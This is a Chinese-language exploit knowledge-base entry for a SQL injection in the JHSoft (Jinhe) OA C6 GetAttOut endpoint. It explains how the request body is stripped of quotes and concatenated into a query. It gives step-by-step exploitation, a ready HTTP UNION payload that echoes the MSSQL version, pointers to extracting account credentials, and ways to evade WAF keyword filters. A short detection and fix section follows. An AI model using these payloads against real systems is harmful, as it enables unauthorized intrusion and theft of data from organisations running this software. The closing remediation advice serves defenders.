---
id: web-generic-sqli-jhsoft-getattout-keyid-union
title: 金和 OA C6 JHSoft.WCF/TEST/GetAttOut 请求体去引号后拼入 keyid 查询：UNION 注入回显 MSSQL 版本
type: scenario
domain: web
path: web/generic/sqli
technique: jhsoft-getattout-keyid-union-prepare-statement-concat
aliases:
- 金和OA GetAttOut SQL注入
- JHSoft.WCF/TEST/GetAttOut
- TestController GetAttOut
- keyId union 注入
- 请求体去引号注入
tags:
- sqli
- mssql
- union
- jhsoft
- oa
- spring
- servlet
- concatenation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V528
  verified_at: '2026-11-11T15:09:47+08:00'
  notes: 已对照原文与img21-25核对：TestController /TEST/GetAttOut路由、readStream+replaceAll去引号、prepareStatement无占位符、img25六列UNION将SQL Server 2016版本回显到attOEndTime均一致。未验证点：未实机复现。dedup候选为同产品其他注入端点，非重复。原文未给版本号，未设affected_versions。
---

## 一句话结论

金和 OA C6 的 `/jc6/JHSoft.WCF/TEST/GetAttOut` 把整个请求体读成字符串、用 `replaceAll("\"","")` 去掉双引号后直接作为 `keyId` 拼进 `select * from outwork where keyid='<keyId>'`，经 `prepareStatement(sql)` 无占位符执行；发送 `1' union select null,null,@@version,null,null,null-- ` 即可把 MSSQL 版本通过响应 JSON 的 `attOEndTime` 字段回显。

## 原理

- **路由**：`web.xml` 把 `/JHSoft.WCF/*` 交给 Spring `DispatcherServlet`；`TestController` 类上 `@RequestMapping({"/TEST/*"})`，方法 `@RequestMapping("GetAttOut")`，完整路径 `/jc6/JHSoft.WCF/TEST/GetAttOut`。
- **参数获取**：`String jsonStr = readStream(request.getInputStream()); String keyId = jsonStr.replaceAll("\"", "");`——整个请求体（无论 Content-Type）被当作 keyId，仅删除双引号，没有做任何类型/字符校验。
- **拼 SQL**：`this.eformService.execSqlReList("select * from outwork where keyid='" + keyId + "'")`；`execSqlReList` 调用 `databaseOperator.execSqlReList(sql)`。
- **伪预编译**：数据访问层最终 `ps = con.prepareStatement(sql); ResultSet rs = ps.executeQuery();`——SQL 文本已拼接完成，没有任何 `?` 占位符，`prepareStatement` 只起到“执行静态 SQL”的作用，不具备防注入效果，这是常见的“用了 PreparedStatement 却仍可注入”的误区。
- **回显路径**：查询结果每行映射为 `{colname, colvalue}`，代码把列名 `ATTOBEGIN TIME`/`ATT...` 的值放入 `map` 并以 JSON 输出；UNION 结果的对应列值即出现在响应字段中，形成有回显注入。
- **为什么要去引号**：原文请求体是 JSON 形态时 `{"keyId":"..."}`，去引号后剩下 `{keyId:...}` 之类；实际可用最简形式：直接让请求体本身就是注入串（不含双引号），去引号操作不影响结果。

## 触发条件

- 目标为金和 OA C6（`/jc6` 上下文），`/JHSoft.WCF/TEST/GetAttOut` 路由可访问（Spring 映射）。
- 数据库为 MSSQL（原文环境 SQL Server 2016；`@@version`、`--` 注释等语法）。
- 原文请求未携带 Cookie/会话（截图仅见 Host、User-Agent 等头部），接口可能未授权可访问，实际按目标确认。
- `outwork` 表存在且查询可执行（业务库表）。

## 利用步骤

1. 基线：POST 请求体 `1`（或 `{"keyId":"1"}`），记录返回 JSON 作为对照。
2. 闭合测试：请求体 `1' and 1=1-- `、`1' and 1=2-- `，观察 `success`/字段差异。
3. UNION 注入：根据 `outwork` 列数构造 `1' union select null,null,@@version,null,null,null-- `（原文用 6 列，第 3 列回显到 `attOEndTime`）。
4. 按需替换 `@@version` 为 `db_name()`、表名/列名子查询、账号口令等逐段提取；若列数不符按报错或响应调整。
5. 若网关过滤双引号，正好利用代码的去引号逻辑：注入串本身不含双引号即可。

## PoC

```http
POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

1' union select null,null,@@version,null,null,null-- 
```

响应（原文截图，节选）：

```json
{"attOEndTime":"Microsoft SQL Server 2016 (SP2-GDR) (KB4293802) - 13.0.5081.1 (X64) ...","attOBeginTime":null,"attOReason":null,"success":"1","attODestination":null}
```

版本字符串出现在 `attOEndTime`，UNION 注入成立。

## 变体与关联

- 变体一：`readStream` 读取任意请求体，Content-Type 不参与判断；可用 JSON、纯文本或表单体承载注入串。
- 变体二：`replaceAll("\"","")` 会把注入串中的双引号删除，构造时避免双引号或用十六进制/`char()` 生成字符串，防止关键字符被删。
- 变体三：UNION 列数随 `outwork` 表结构变化，可从 1 逐列递增试到不报错；也可用报错/时间盲注替代。
- 关联：[[web-generic-sqli-jhsoft-clobfield-readclob-concat]]（同文章另一注入点，原生 `Statement` 拼接）、[[web-generic-file-upload-jhsoft-saveasotherformatservlet-filename-webshell]]（同文章任意文件上传）、[[web-generic-sqli-jhsoft-homeservice-getuserinfo-getusersex]]（同产品 ASMX 拼接注入）、[[web-generic-sqli-jhsoft-incentiveplan-fulfill-incentiveid-version]]（同产品 MSSQL 注入）。
- 边界：非 MSSQL 需换对应版本函数；接口若加认证/网关过滤 `select`、`union` 等关键字，需按过滤实现调整大小写、注释、编码。

## 检测与防御

- 检测：`GetAttOut` 请求体出现 `union select`、`@@version`、单引号、`--`、`convert(`、`WAITFOR` 等特征；响应 JSON 中业务字段出现数据库版本/异常字符串；请求体长度异常。
- 修复：`keyId` 作为参数化查询的绑定变量（`select * from outwork where keyid=?`），禁止字符串拼接；`execSqlReList` 改为预编译并校验参数类型。
- 加固：错误/异常不回显到 JSON；接口加认证与最小权限数据库账号；WAF 覆盖请求体（不仅 URL/表单）中的 SQL 特征，注意该接口直接读取原始流，常规表单防护可能失效。
